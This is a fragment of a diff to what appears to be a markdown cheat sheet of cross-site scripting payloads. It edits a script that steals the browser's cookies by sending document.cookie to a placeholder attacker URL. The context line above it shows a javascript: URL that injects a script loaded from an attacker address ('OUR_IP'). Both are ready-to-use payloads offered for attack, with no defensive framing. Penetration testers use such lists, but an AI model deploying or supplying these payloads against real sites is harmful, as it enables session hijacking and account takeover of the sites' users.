@@ -33,6 +33,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 
 ### script: XSS cookie exfiltration with javascript
 ```html
-<script>new Image().src="<your_url>/?output="+document.cookie;</script>
+<script>new Image().src="<your_url>/page.html?output="+document.cookie;</script>
 ```
 ---
